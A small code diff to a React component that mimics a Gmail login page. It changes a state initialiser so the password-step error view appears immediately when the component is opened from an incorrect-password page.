@@ -42,7 +42,10 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
-  const [pageReady, setPageReady] = useState(false);
+  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
+  // the 100ms pageReady gate so the password-step error UI renders immediately
+  // — without flashing the spinner or any of the email-step UI.
+  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
   const [isTransitioning, setIsTransitioning] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
 
